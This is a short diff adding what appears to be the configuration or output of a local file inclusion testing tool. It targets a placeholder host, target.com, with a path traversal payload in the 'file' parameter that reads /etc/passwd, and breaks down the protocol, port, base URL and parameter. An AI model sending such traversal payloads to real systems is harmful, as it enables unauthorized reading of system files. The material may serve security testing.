@@ -1,0 +1,9 @@
+Target: https://target.com:8443/admin/panel.php?file=../../../etc/passwd
+
+Configuration:
+  Protocol: https
+  Port: 8443
+  Target: target.com
+  LFI Type: param
+  Base URL: https://target.com:8443/admin/panel.php
+  Parameter: file
